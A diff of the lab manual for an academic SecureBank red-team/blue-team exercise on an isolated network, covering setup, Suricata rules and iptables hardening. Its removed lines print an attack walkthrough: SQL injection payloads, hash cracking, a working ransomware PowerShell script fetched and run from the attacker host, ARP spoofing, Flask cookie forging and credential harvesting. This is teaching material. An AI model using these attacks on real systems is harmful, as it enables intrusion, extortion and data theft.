@@ -1,94 +1,177 @@
-# SecureBank — Vulnerable Web Banking Lab
+# SecureBank Lab Manual — Attack vs Defense
 
-Academic cybersecurity lab environment for the SecureBank Incident challenge (Red Team vs Blue Team).
+Academic cybersecurity lab for the SecureBank Incident challenge. **Teams of 2** (one Red Team attacker, one Blue Team defender).
 
-## Overview
+---
 
-A deliberately vulnerable Flask banking portal with 7 fake corporate clients, designed for attack/defense exercises in an isolated VirtualBox host-only network.
+## 1. Lab Overview
 
-## Vulnerabilities (Red Team Targets)
+### Scenario
 
-| Vulnerability | Location | Exploit |
+SecureBank is a small financial startup. The Blue Team is responsible for building and securing the infrastructure. The Red Team must breach it.
+
+### VM Roles & Responsibility
+
+| VM | Assigned To | Role | OS |
+|---|---|---|---|
+| **Kali Linux** | **Red Team** (Attacker) | Launch all attacks from here | Kali Linux (latest) |
+| **Ubuntu Server** | **Blue Team** (Defender) | Deploy & secure the banking portal, SMB, Suricata, iptables | Ubuntu Server 22.04/24.04 LTS |
+| **Windows Host** | **Blue Team** (Defender) | Simulate employee workstation with Sysmon, customer data | Windows 10/11 Pro |
+
+### Network Design
+
+- **VirtualBox Host-Only Network**: `192.168.100.0/24`
+- **No internet access** — all tools and wordlists must be local
+- **Static IPs** (assigned inside each OS):
+
+| VM | IP Address | Purpose |
 |---|---|---|
-| **SQL Injection** | `POST /login` — `WHERE username = '{username}'` | F-string concatenation, no parameterized queries |
-| **Verbose Error Leak** | `POST /login` `except` block | Raw SQLite error message rendered in `{{ error }}` |
-| **Weak Session Key** | `app.secret_key = "bank_secret"` | Hardcoded guessable Flask secret |
-| **Unsalted SHA256 Passwords** | Passwords hashed with SHA256 (no salt) | Crackable with HashCat/John from rockyou.txt |
+| Kali Linux | `192.168.100.50` | Attacker machine |
+| Ubuntu Server | `192.168.100.10` | Target server |
+| Windows Host | `192.168.100.100` | Victim workstation |
 
-## Project Structure
+### Red Team Mission (Attack)
 
-```
-F:\BankingApp\
-├── app.py                    # Flask app (all routes + vulnerabilities)
-├── setup_db.py               # DB initializer (7 users, 42 transactions)
-├── requirements.txt          # Python deps
-├── package.json              # Tailwind CLI
-├── tailwind.config.js        # Custom theme config
-├── database\db.sqlite        # SQLite database (generated)
-├── static\
-│   ├── css\tailwind.css      # Local compiled Tailwind (no CDN)
-│   ├── fonts\                # Inter + Material Symbols (local)
-│   └── images\               # Hero, founder, profile avatars
-└── templates\
-    ├── index.html            # Landing page
-    ├── login.html            # Login form
-    └── dashboard.html        # Customer dashboard
-```
+Achieve **two of three** goals:
 
-## Deploy on Ubuntu Server (Lab Instructions)
+1. **Steal customer data** — read the SQLite database or extract 5+ customer records
+2. **Simulate ransomware** — encrypt `C:\TestRansom\` on Windows, leave a ransom note
+3. **Session hijacking** — impersonate an authenticated user on the banking portal
 
-### 1. Transfer the project
+### Blue Team Mission (Defense)
+
+Prevent the Red Team from achieving more than **one** goal. Minimum required defenses:
+
+- Configure **Suricata IDS** (Nmap, ARP spoof, EternalBlue, SMB login alerts)
+- **iptables** hardening (only SSH, HTTPS, OpenVPN; deny SMB from Kali)
+- **HSTS** on the web portal
+- **Sysmon** on Windows (process, file, network logging)
+- **Hourly backups** (ZFS snapshot or rsync + chattr)
+
+### Lab Dependencies & Wordlists
+
+Since there is **no internet**, all tools must be pre-installed and wordlists pre-loaded:
+
+- **Kali**: Nmap, Metasploit, Bettercap, HashCat, John, responder, `rockyou.txt`
+- **Ubuntu**: Apache2, mod_wsgi, Samba, Suricata, iptables-persistent, OpenVPN, OpenSSL
+- **Windows**: Sysmon (downloaded beforehand), Firefox, PowerShell
+
+---
+
+## 2. VirtualBox Host-Only Network Setup
+
+*Performed by: Both teams (instructor or shared setup)*
+
+### 2.1 Create the Host-Only Network
+
+1. Open **VirtualBox** → **File** → **Tools** → **Network Manager**
+2. Click **Create** (Host-only Network)
+3. Configure the adapter:
+
+| Setting | Value |
+|---|---|
+| Adapter IPv4 Address | `192.168.100.1` |
+| Adapter IPv4 Network Mask | `255.255.255.0` |
+| DHCP Server | **Disabled** (static IPs only) |
+
+4. Click **Apply**
+
+### 2.2 VM General Settings
+
+For each VM, ensure:
+
+| Setting | Kali Linux | Ubuntu Server | Windows Host |
+|---|---|---|---|
+| RAM | 4096 MB | 2048 MB | 4096 MB |
+| CPUs | 2 | 2 | 2 |
+| Disk | 60 GB | 20 GB | 60 GB |
+| Network Adapter 1 | Host-Only | Host-Only | Host-Only |
+
+### 2.3 OS Installation Notes
+
+- **Kali Linux**: Download from kali.org. Install with default options. Full desktop recommended.
+- **Ubuntu Server**: Use LTS (22.04 or 24.04). **Minimal install**, no desktop needed (CLI only).
+- **Windows Host**: Standard Windows 10/11 Pro installation. Set up a local user `employee`.
+
+---
+
+## 3. VM Setup — Step by Step
+
+Each section specifies **who** performs the steps.
+
+---
+
+### 3.1 Ubuntu Server Setup — [BLUE TEAM]
+
+All commands below run **on the Ubuntu Server VM** as root or with `sudo`.
+
+#### 3.1.1 Configure Static IP
 
 ```bash
-# From your Windows host, push to GitHub first, then on Ubuntu:
-sudo apt install git python3 python3-pip nodejs npm -y
-git clone https://github.com/YOUR_USER/securebank-lab.git /var/www/bank
+# Edit netplan config (Ubuntu 24.04)
+sudo nano /etc/netplan/01-netcfg.yaml
+```
+
+```yaml
+network:
+  version: 2
+  ethernets:
+    enp0s3:
+      addresses: [192.168.100.10/24]
+      gateway4: 192.168.100.1
+      nameservers:
+        addresses: [8.8.8.8, 1.1.1.1]
+```
+
+```bash
+sudo netplan apply
+```
+
+#### 3.1.2 Set Hostname
+
+```bash
+sudo hostnamectl set-hostname securebank-server
+echo "192.168.100.10 securebank-server" | sudo tee -a /etc/hosts
+```
+
+#### 3.1.3 Install System Dependencies
+
+```bash
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y git python3 python3-pip python3-venv \
+  apache2 libapache2-mod-wsgi-py3 openssl samba \
+  suricata iptables-persistent nodejs npm
+```
+
+#### 3.1.4 Deploy the Flask Application
+
+```bash
+# Clone from your GitHub repository
+cd /var/www
+sudo git clone https://github.com/YOUR_TEAM/securebank-lab.git bank
+sudo chown -R www-data:www-data /var/www/bank
 cd /var/www/bank
+
+# Install Python dependencies
+sudo pip3 install -r requirements.txt
+
+# Install Node + build Tailwind CSS
+sudo npm install
+sudo npx tailwindcss -i static/css/input.css -o static/css/tailwind.css --minify
+
+# Initialize the database
+sudo python3 setup_db.py
 ```
 
-### 2. Install dependencies
-
-```bash
-pip3 install -r requirements.txt
-npm install
-```
-
-### 3. Build Tailwind CSS (run once)
-
-```bash
-npx tailwindcss -i static/css/input.css -o static/css/tailwind.css --minify
-```
-
-### 4. Initialize database
-
-```bash
-python3 setup_db.py
-```
-
-### 5. Deploy with Apache2 + mod_wsgi
-
-```bash
-sudo apt install apache2 libapache2-mod-wsgi-py3 openssl -y
-```
-
-#### 5a. Enable required Apache modules
+#### 3.1.5 Configure Apache2 + mod_wsgi
 
 ```bash
 sudo a2enmod wsgi ssl rewrite headers
-sudo systemctl restart apache2
 ```
 
-#### 5b. Set permissions
-
-```bash
-sudo chown -R www-data:www-data /var/www/bank
-sudo chmod -R 755 /var/www/bank
-```
-
-#### 5c. Create Apache virtual host (HTTP)
+**Create HTTP virtual host** — `/etc/apache2/sites-available/securebank.conf`:
 
 ```apache
-# /etc/apache2/sites-available/securebank.conf
 <VirtualHost *:80>
     ServerName 192.168.100.10
     DocumentRoot /var/www/bank
@@ -110,38 +193,42 @@ sudo chmod -R 755 /var/www/bank
 </VirtualHost>
 ```
 
+Enable and reload:
+
 ```bash
+sudo a2dissite 000-default.conf
 sudo a2ensite securebank.conf
 sudo systemctl reload apache2
 ```
 
-#### 5d. Generate self-signed CA certificate for HTTPS (Lab 5)
+**Verify the app is running** — from Kali or Windows browser: `http://192.168.100.10`
+
+#### 3.1.6 Generate Self-Signed CA & HTTPS Certificate (Lab 5)
 
 ```bash
-# Create CA key and certificate
-openssl genrsa -out /etc/ssl/private/securebank-ca-key.pem 2048
-openssl req -x509 -new -nodes -key /etc/ssl/private/securebank-ca-key.pem \
+# CA key and certificate
+sudo openssl genrsa -out /etc/ssl/private/securebank-ca-key.pem 2048
+sudo openssl req -x509 -new -nodes -key /etc/ssl/private/securebank-ca-key.pem \
   -sha256 -days 365 -out /etc/ssl/certs/securebank-ca.pem \
-  -subj "/C=US/ST=State/L=City/O=SecureBank/CN=SecureBankCA"
+  -subj "/C=US/ST=NY/L=NYC/O=SecureBank/CN=SecureBankCA"
 
-# Create server key and CSR
-openssl genrsa -out /etc/ssl/private/securebank-key.pem 2048
-openssl req -new -key /etc/ssl/private/securebank-key.pem \
+# Server key and CSR
+sudo openssl genrsa -out /etc/ssl/private/securebank-key.pem 2048
+sudo openssl req -new -key /etc/ssl/private/securebank-key.pem \
   -out /etc/ssl/certs/securebank.csr \
-  -subj "/C=US/ST=State/L=City/O=SecureBank/CN=192.168.100.10"
+  -subj "/C=US/ST=NY/L=NYC/O=SecureBank/CN=192.168.100.10"
 
-# Sign server cert with CA
-openssl x509 -req -in /etc/ssl/certs/securebank.csr \
+# Sign server certificate with CA
+sudo openssl x509 -req -in /etc/ssl/certs/securebank.csr \
   -CA /etc/ssl/certs/securebank-ca.pem \
   -CAkey /etc/ssl/private/securebank-ca-key.pem \
   -CAcreateserial -out /etc/ssl/certs/securebank-cert.pem \
   -days 365 -sha256
 ```
 
-#### 5e. Create Apache virtual host (HTTPS)
+**Create HTTPS virtual host** — `/etc/apache2/sites-available/securebank-ssl.conf`:
 
 ```apache
-# /etc/apache2/sites-available/securebank-ssl.conf
 <VirtualHost *:443>
     ServerName 192.168.100.10
     DocumentRoot /var/www/bank
@@ -151,6 +238,7 @@ openssl x509 -req -in /etc/ssl/certs/securebank.csr \
     SSLCertificateKeyFile /etc/ssl/private/securebank-key.pem
     SSLCertificateChainFile /etc/ssl/certs/securebank-ca.pem
 
+    # === HSTS (Defense Requirement) ===
     Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
 
     WSGIDaemonProcess bank-ssl python-path=/var/www/bank
@@ -175,349 +263,83 @@ sudo a2ensite securebank-ssl.conf
 sudo systemctl reload apache2
 ```
 
-Access at `http://192.168.100.10` or `https://192.168.100.10`
+**Verify HTTPS**: `https://192.168.100.10` (browser will show warning — accept risk or install CA cert).
 
-### 6. Install the CA certificate on Windows client (Lab 5)
-
-On the Windows host, import `/etc/ssl/certs/securebank-ca.pem` into **Trusted Root Certification Authorities** so the browser trusts the self-signed HTTPS cert.
-
----
-
-## Lab Walkthrough — Attack vs Defense
-
-### Network Topology
-
-| VM | IP Address | Role | Key Tools/Services |
-|---|---|---|---|
-| Kali Linux | `192.168.100.50` | Attacker | Nmap, Metasploit, Bettercap, HashCat, John, responder |
-| Ubuntu Server | `192.168.100.10` | Target | Apache2 + mod_wsgi (Flask), OpenVPN, SMB, Suricata IDS |
-| Windows Host | `192.168.100.100` | Victim PC | Firefox, Sysmon, PowerShell |
-
-All VMs on isolated VirtualBox host-only network (`192.168.100.0/24`). No internet access.
-
----
-
-### Phase 0 — Environment Setup
-
-#### 0a. Ubuntu Server — Additional Services
+#### 3.1.7 Configure SMB Share with Fake Customer Data
 
 ```bash
-# SMB share for internal file sharing
-sudo apt install samba -y
 sudo mkdir -p /srv/smb/share
-echo -e "[securebank]\npath = /srv/smb/share\nbrowseable = yes\nread only = no\nguest ok = yes" | sudo tee -a /etc/samba/smb.conf
+
+# Create customer data file (5+ records — Red Team target)
+sudo tee /srv/smb/share/customer_emails.txt > /dev/null <<EOF
+Customer: Alice Johnson, Account: SB-1001, Balance: \$5500.00, SSN: 123-45-6789
+Customer: Bob Smith, Account: SB-1002, Balance: \$12300.00, SSN: 234-56-7890
+Customer: Charlie Brown, Account: SB-1003, Balance: \$8700.00, SSN: 345-67-8901
+Customer: Diana Prince, Account: SB-1004, Balance: \$22150.00, SSN: 456-78-9012
+Customer: Edward Norton, Account: SB-1005, Balance: \$3120.00, SSN: 567-89-0123
+Customer: Frank Castle, Account: SB-1006, Balance: \$9750.00, SSN: 678-90-1234
+Customer: Grace Hopper, Account: SB-1007, Balance: \$6400.00, SSN: 789-01-2345
+EOF
+
+# Add SMB share config
+echo -e "\n[securebank]\ncomment = SecureBank Shared Data\npath = /srv/smb/share\nbrowseable = yes\nread only = no\nguest ok = yes\ncreate mask = 0644" | sudo tee -a /etc/samba/smb.conf
+
 sudo systemctl restart smbd
-
-# Create fake customer data file on SMB share
-echo "Customer: Alice, Balance: 5500, SSN: 123-45-6789" | sudo tee /srv/smb/share/customer_emails.txt
-echo "Customer: Bob, Balance: 12300, SSN: 234-56-7890" | sudo tee -a /srv/smb/share/customer_emails.txt
-echo "Customer: Charlie, Balance: 8700, SSN: 345-67-8901" | sudo tee -a /srv/smb/share/customer_emails.txt
-echo "Customer: Diana, Balance: 22150, SSN: 456-78-9012" | sudo tee -a /srv/smb/share/customer_emails.txt
-echo "Customer: Edward, Balance: 3120, SSN: 567-89-0123" | sudo tee -a /srv/smb/share/customer_emails.txt
-
-# OpenVPN (optional gateway)
-sudo apt install openvpn -y
+sudo systemctl enable smbd
 ```
 
-#### 0b. Windows Host — Test Data & Sysmon
-
-```powershell
-# Create lab files on desktop
-New-Item -ItemType Directory -Path "$env:USERPROFILE\Desktop\SecureBank_Data" -Force
-Set-Content -Path "$env:USERPROFILE\Desktop\SecureBank_Data\customer_emails.txt" -Value @"
-Customer: Alice, Balance: 5500, SSN: 123-45-6789
-Customer: Bob, Balance: 12300, SSN: 234-56-7890
-Customer: Charlie, Balance: 8700, SSN: 345-67-8901
-Customer: Diana, Balance: 22150, SSN: 456-78-9012
-Customer: Edward, Balance: 3120, SSN: 567-89-0123
-"@
-
-# Create a test ransomware target folder
-New-Item -ItemType Directory -Path "C:\TestRansom" -Force
-Set-Content -Path "C:\TestRansom\notes.txt" -Value "This is simulated sensitive business data."
-Set-Content -Path "C:\TestRansom\budget.xlsx" -Value "Q4 Budget Forecast - Confidential"
-
-# Install Sysmon (Lab 7)
-# Download Sysmon from Microsoft Sysinternals, then:
-# sysmon64.exe -accepteula -i sysmon-config.xml
-```
-
-#### 0c. Kali Linux — Verify Tools
+#### 3.1.8 Configure Suricata IDS — [BLUE TEAM DEFENSE]
 
 ```bash
-sudo apt update
-sudo apt install nmap metasploit-framework bettercap hashcat john responder -y
-# Verify rockyou.txt exists
-ls -la /usr/share/wordlists/rockyou.txt.gz
-# If missing: sudo apt install wordlist -y
-```
-
----
-
-### Phase 1 — Red Team: Attack Walkthrough
-
-Choose **two of three** goals to complete.
-
----
-
-#### Goal 1 — Steal Customer Data (SQL Injection Path)
-
-##### Step 1.1 — Reconnaissance
-
-```bash
-# Nmap scan of Ubuntu server
-nmap -sV -sC -p- 192.168.100.10 -oN nmap_scan.txt
-```
-
-Expected open ports: `80 (HTTP)`, `443 (HTTPS)`, `139/445 (SMB)`, `1194 (OpenVPN)`, `22 (SSH)`.
-
-##### Step 1.2 — Web App Recon
-
-```bash
-# Browse to the web app and test login
-# Try SQLi manually first:
-# Username: ' OR 1=1--
-# Password: anything
-```
-
-**Expected result:** The app returns "Invalid credentials" (the query returns a row but hash doesn't match). The SQLi **is working** — the WHERE clause is bypassed.
-
-##### Step 1.3 — Trigger Verbose Error to Confirm SQLi
-
-```
-Username: ' UNION SELECT 1,2,3,4,5,6--
-Password: anything
-```
-
-**Expected result:** Error message displayed: `Database error: SELECTs to the left and right of UNION do not have the same number of result columns`. This confirms the injection point and reveals the table has 5 columns.
-
-##### Step 1.4 — Extract Data via UNION
-
-```bash
-# First, find the hash of a known password to use in UNION injection
-# SHA256('x') = 2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881
-```
-
-```bash
-# Calculate hash on Kali:
-echo -n "x" | sha256sum
-```
-
-```
-# Login as injected user:
-# Username: ' UNION SELECT 1,'inj','2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881','Injected',9999--
-# Password: x
-```
-
-**Expected result:** Redirect to dashboard — you're logged in as the injected user. This proves full SQLi exploitation.
-
-##### Step 1.5 — Dump Password Hashes
-
-```bash
-# Use sqlmap for automated extraction:
-sqlmap -u "http://192.168.100.10/login" --data="username=admin&password=test" \
-  --method POST --batch --dump
-```
-
-Or manually extract all hashes via UNION injections across multiple requests to enumerate the `users` table.
-
-##### Step 1.6 — Crack Hashes with HashCat
-
-```bash
-# Save extracted hashes to file (format: username:hash)
-echo "alice:4980b1f29fa32ff1..." > hashes.txt
-echo "bob:ef92b778bafe771e..." >> hashes.txt
-# ... all 7 users
-
-# Crack with HashCat using rockyou.txt
-hashcat -m 1400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
-```
-
-HashCat mode `1400` = SHA256.
-
-##### Step 1.7 — Login as Any User
-
-Once cracked, login as any user at `http://192.168.100.10/login` to access their dashboard and view their balance and transaction history. Steal at least 5 customer records for the report.
-
-##### Step 1.8 — Alternative: Steal Database File Directly
-
-If SMB misconfigured or you gain shell access:
-
-```bash
-# Via SMB (if guest access is enabled)
-smbclient //192.168.100.10/securebank -N
-get customer_emails.txt
-exit
-
-# Via reverse shell (if you achieve RCE)
-# Copy the SQLite DB
-cp /var/www/bank/database/db.sqlite /tmp/
-```
-
----
-
-#### Goal 2 — Ransomware Simulation on Windows Host
-
-##### Step 2.1 — Initial Access (Phishing / Credential Theft)
-
-```bash
-# Use responder to capture NTLM hashes on the network
-sudo responder -I eth0 -w -F
-```
-
-When the Windows victim visits a fake SMB share or authenticates, capture their NetNTLM hash.
-
-##### Step 2.2 — Deliver the Ransomware Script
-
-Create `ransomware.ps1` on Kali, host it, and get the victim to run it:
-
-```powershell
-# ransomware.ps1 — encrypts C:\TestRansom\ using AES
-# (Academic lab use only — single non-critical folder)
-
-$key = [byte[]]::new(32)
-[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($key)
-
-$files = Get-ChildItem -Path "C:\TestRansom\" -File -Recurse
-foreach ($file in $files) {
-    $content = [IO.File]::ReadAllBytes($file.FullName)
-    $encrypted = [Security.Cryptography.Aes]::Create().CreateEncryptor($key, [byte[]]::new(16)).TransformFinalBlock($content, 0, $content.Length)
-    [IO.File]::WriteAllBytes("$($file.FullName).encrypted", $encrypted)
-    Remove-Item $file.FullName -Force
-}
-
-# Drop ransom note
-@"
---- SECUREBACK ---
-Your files have been encrypted.
-To restore, contact attacker@securebank.xyz
-ID: SB-$(Get-Random -Maximum 99999)
-"@ | Out-File -FilePath "C:\TestRansom\README_RANSOM.txt"
-```
-
-```bash
-# On Kali, host the script:
-python3 -m http.server 8080
-```
-
-Victim downloads and runs: `powershell -c "Invoke-WebRequest -Uri http://192.168.100.50:8080/ransomware.ps1 -OutFile %temp%\r.ps1; powershell %temp%\r.ps1"`
-
-##### Step 2.3 — Simulate Recovery (for Blue Team demonstration)
-
-```bash
-# Decrypt script (demonstrate recovery):
-# Use the same $key to reverse the encryption
-```
-
----
-
-#### Goal 3 — Impersonate an Authenticated User (Session Hijacking)
-
-##### Step 3.1 — Session Sniffing with Bettercap
-
-```bash
-# ARP spoof to become MITM
-sudo bettercap -eval "set arp.spoof.targets 192.168.100.100; arp.spoof on; net.sniff on"
-
-# Or use ettercap for HTTP session capture:
-sudo ettercap -T -M arp:remote /192.168.100.10// /192.168.100.100//
-```
-
-##### Step 3.2 — Decrypt the Flask Session Cookie
-
-Flask signs sessions with `itsdangerous`. The secret key is `"bank_secret"` (hardcoded in `app.py`). Capture a victim's session cookie via MITM, then:
-
-```bash
-# Decode Flask session cookie
-pip3 install flask-unsign
-flask-unsign --decode --cookie "eyJiYWxhbmNlIjo1NTAw...<full cookie>"
-```
-
-Expected output shows the session payload: `{'balance': 5500.0, 'user_name': 'Alice Johnson'}`
-
-##### Step 3.3 — Forge a Session Cookie
-
-```bash
-# Forge session as any user
-flask-unsign --sign --cookie "{'balance': 99999.0, 'user_name': 'Admin'}" --secret "bank_secret"
-```
-
-Inject the forged cookie into your browser and access `/dashboard` to impersonate any user.
-
-##### Step 3.4 — Alternative: Credential Theft via Phishing
-
-```bash
-# Clone the login page and capture creds
-# OR use evilginx2 / setoolkit for credential harvesting
-sudo setoolkit
-# Select: Social Engineering Attacks > Website Attack Vectors > Credential Harvester
-```
-
----
-
-### Phase 2 — Blue Team: Defense Walkthrough
-
----
-
-#### Defense 1 — Suricata IDS Configuration
-
-##### Step 1.1 — Install Suricata
-
-```bash
-sudo apt install suricata -y
 sudo systemctl stop suricata
 ```
-
-##### Step 1.2 — Custom Rules for Detection
 
 Create `/etc/suricata/rules/securebank.rules`:
 
 ```suricata
-# Detect Nmap scan
-alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Nmap TCP Scan detected"; \
+# 1. Nmap scan detection
+alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"[SECUREBANK] Nmap TCP Scan detected"; \
   flow:to_server; detection_filter:track by_src, count 50, seconds 10; \
   sid:1000001; rev:1;)
 
-# Detect ARP spoofing (Bettercap)
-alert arp $EXTERNAL_NET any -> $HOME_NET any (msg:"ARP spoofing detected"; \
+# 2. ARP spoofing detection (Bettercap)
+alert arp $EXTERNAL_NET any -> $HOME_NET any (msg:"[SECUREBANK] ARP spoofing detected"; \
   arp.opcode:2; \
   sid:1000002; rev:1;)
 
-# Detect EternalBlue exploit (MS17-010)
-alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"EternalBlue exploit attempt"; \
+# 3. EternalBlue exploit detection (MS17-010)
+alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"[SECUREBANK] EternalBlue exploit attempt"; \
   flow:to_server; content:"|00 00 00 31 ff|SMB|2e 00|"; \
   sid:1000003; rev:1;)
 
-# Detect SMB login attempts
-alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"SMB login attempt"; \
+# 4. SMB login attempt detection
+alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"[SECUREBANK] SMB login attempt"; \
   flow:to_server; content:"|00 00 00 00|"; depth:200; \
   sid:1000004; rev:1;)
 ```
 
-##### Step 1.3 — Enable Rules
-
 ```bash
+# Add rules to Suricata config
 echo -e "\nrule-files:\n  - securebank.rules" | sudo tee -a /etc/suricata/suricata.yaml
+
 sudo systemctl start suricata
+sudo systemctl enable suricata
 ```
 
-##### Step 1.4 — Monitor Alerts
+**Monitor alerts in real-time:**
 
 ```bash
 sudo tail -f /var/log/suricata/fast.log
-# Or use: sudo jq . /var/log/suricata/eve.json | grep alert
 ```
 
----
-
-#### Defense 2 — iptables Hardening
+#### 3.1.9 Harden iptables — [BLUE TEAM DEFENSE]
 
 ```bash
 # Flush existing rules
 sudo iptables -F
 sudo iptables -X
 
-# Default deny all inbound
+# Default policies: deny all inbound
 sudo iptables -P INPUT DROP
 sudo iptables -P FORWARD DROP
 sudo iptables -P OUTPUT ACCEPT
@@ -528,99 +350,24 @@ sudo iptables -A INPUT -i lo -j ACCEPT
 # Allow established connections
 sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
 
-# Allow SSH (from management only)
-sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.100.0/24 -j ACCEPT
+# --- Allow necessary services (from lab subnet only) ---
+sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.100.0/24 -j ACCEPT   # SSH
+sudo iptables -A INPUT -p tcp --dport 443 -s 192.168.100.0/24 -j ACCEPT  # HTTPS
+sudo iptables -A INPUT -p tcp --dport 80 -s 192.168.100.0/24 -j ACCEPT   # HTTP (redirect)
+sudo iptables -A INPUT -p udp --dport 1194 -s 192.168.100.0/24 -j ACCEPT # OpenVPN
 
-# Allow HTTPS (web portal)
-sudo iptables -A INPUT -p tcp --dport 443 -s 192.168.100.0/24 -j ACCEPT
-
-# Allow HTTP (redirect to HTTPS)
-sudo iptables -A INPUT -p tcp --dport 80 -s 192.168.100.0/24 -j ACCEPT
-
-# Allow OpenVPN
-sudo iptables -A INPUT -p udp --dport 1194 -s 192.168.100.0/24 -j ACCEPT
-
-# Deny SMB from Kali specifically
+# --- Explicitly DENY SMB from Kali ---
 sudo iptables -A INPUT -p tcp --dport 445 -s 192.168.100.50 -j DROP
 sudo iptables -A INPUT -p tcp --dport 139 -s 192.168.100.50 -j DROP
 
-# Log dropped packets (for Suricata correlation)
+# Log dropped packets for Suricata correlation
 sudo iptables -A INPUT -j LOG --log-prefix "IPTABLES-DROP: "
 
-# Make persistent
-sudo apt install iptables-persistent -y
+# Make persistent across reboots
 sudo netfilter-persistent save
 ```
 
----
-
-#### Defense 3 — HSTS on Web Portal
-
-Already configured in the Apache SSL vhost above:
-
-```apache
-Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
-```
-
-Verify with curl:
-
-```bash
-curl -I https://192.168.100.10 --insecure | grep -i strict
-```
-
-Expected: `Strict-Transport-Security: max-age=31536000; includeSubDomains`
-
----
-
-#### Defense 4 — Sysmon on Windows Host (Lab 7)
-
-```powershell
-# Download Sysmon from Microsoft Sysinternals
-# Download sysmon-config from https://github.com/SwiftOnSecurity/sysmon-config
-
-# Install Sysmon
-sysmon64.exe -accepteula -i sysmon-config.xml
-
-# Verify installation
-Get-Service Sysmon64
-
-# View logs in Event Viewer:
-# Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
-
-# Key Event IDs to monitor:
-#   1 - Process creation
-#   3 - Network connection
-#   11 - FileCreate
-#   15 - FileCreateStreamHash
-```
-
-For memory forensics with Volatility:
-
-```powershell
-# Capture memory dump
-# Download LiveKD or use a dedicated memory capture tool
-# dumpit.exe (from Comae) or winpmem
-```
-
-```bash
-# On Kali, analyze with Volatility:
-volatility -f memory.dump imageinfo
-volatility -f memory.dump --profile=Win10x64 pslist
-volatility -f memory.dump --profile=Win10x64 netscan
-volatility -f memory.dump --profile=Win10x64 cmdline
-```
-
----
-
-#### Defense 5 — Automated Backups for Recovery
-
-```bash
-# Option A: ZFS snapshots (hourly)
-sudo zfs snapshot rpool/ROOT@hourly-$(date +%Y%m%d-%H%M)
-
-# Option B: rsync + chattr (simpler)
-sudo apt install rsync -y
-```
+#### 3.1.10 Configure Hourly Backups — [BLUE TEAM DEFENSE]
 
 Create `/usr/local/bin/securebank-backup.sh`:
 
@@ -630,13 +377,11 @@ BACKUP_DIR="/var/backups/securebank"
 mkdir -p "$BACKUP_DIR"
 rsync -av --delete /var/www/bank/ "$BACKUP_DIR/current/"
 chattr -R +i "$BACKUP_DIR/current/"
-echo "Backup completed: $(date)" >> /var/log/securebank-backup.log
+echo "[$(date)] Backup completed" >> /var/log/securebank-backup.log
 ```
 
 ```bash
 sudo chmod +x /usr/local/bin/securebank-backup.sh
-
-# Add to crontab for hourly backups
 echo "0 * * * * root /usr/local/bin/securebank-backup.sh" | sudo tee /etc/cron.d/securebank-backup
 ```
 
@@ -648,61 +393,575 @@ rsync -av /var/backups/securebank/current/ /var/www/bank/
 sudo systemctl reload apache2
 ```
 
+#### 3.1.11 (Optional) OpenVPN Gateway
+
+```bash
+sudo apt install openvpn -y
+# Follow standard OpenVPN server setup to create a gateway entry point
+```
+
 ---
 
-### Phase 3 — Attack Timeline (Combined)
+### 3.2 Windows Host Setup — [BLUE TEAM]
 
-| Time | Red Team Action | Blue Team Detection / Response |
+All commands below run **on the Windows Host VM**.
+
+#### 3.2.1 Configure Static IP
+
+1. Open **Control Panel** → **Network and Sharing Center** → **Change adapter settings**
+2. Right-click the Host-Only adapter → **Properties**
+3. Select **Internet Protocol Version 4 (TCP/IPv4)** → **Properties**
+4. Set:
+   - IP address: `192.168.100.100`
+   - Subnet mask: `255.255.255.0`
+   - Default gateway: `192.168.100.1`
+
+#### 3.2.2 Install the CA Certificate (Lab 5)
+
+1. Copy `securebank-ca.pem` from Ubuntu to the Windows VM (via USB or shared folder)
+2. Double-click `securebank-ca.pem` → **Install Certificate**
+3. Choose **Local Machine** → **Place all certificates in the following store**
+4. Browse → **Trusted Root Certification Authorities** → **Next** → **Finish**
+
+Verify: browse to `https://192.168.100.10` — there should be **no certificate warning**.
+
+#### 3.2.3 Create Lab Files (Customer Data)
+
+```powershell
+# Create test data on desktop
+New-Item -ItemType Directory -Path "$env:USERPROFILE\Desktop\SecureBank_Data" -Force
+
+Set-Content -Path "$env:USERPROFILE\Desktop\SecureBank_Data\customer_emails.txt" -Value @"
+Customer: Alice Johnson, Account: SB-1001, Balance: 5500.00, SSN: 123-45-6789
+Customer: Bob Smith, Account: SB-1002, Balance: 12300.00, SSN: 234-56-7890
+Customer: Charlie Brown, Account: SB-1003, Balance: 8700.00, SSN: 345-67-8901
+Customer: Diana Prince, Account: SB-1004, Balance: 22150.00, SSN: 456-78-9012
+Customer: Edward Norton, Account: SB-1005, Balance: 3120.00, SSN: 567-89-0123
+Customer: Frank Castle, Account: SB-1006, Balance: 9750.00, SSN: 678-90-1234
+Customer: Grace Hopper, Account: SB-1007, Balance: 6400.00, SSN: 789-01-2345
+"@
+
+# Create financial forecast file
+Set-Content -Path "$env:USERPROFILE\Desktop\SecureBank_Data\financial_forecast.xlsx" -Value "Q4 2024 Forecast - Revenue: \$2.4M, Expenses: \$1.1M, Net: \$1.3M"
+
+Write-Output "Lab data created at: $env:USERPROFILE\Desktop\SecureBank_Data"
+```
+
+#### 3.2.4 Create Ransomware Target Folder (Red Team Target)
+
+```powershell
+New-Item -ItemType Directory -Path "C:\TestRansom" -Force
+
+Set-Content -Path "C:\TestRansom\budget_2024.xlsx" -Value "Budget Forecast - Confidential"
+Set-Content -Path "C:\TestRansom\employee_records.txt" -Value "Employee: John, Salary: 85000"
+Set-Content -Path "C:\TestRansom\project_plan.docx" -Value "SecureBank Migration Plan v2.3"
+```
+
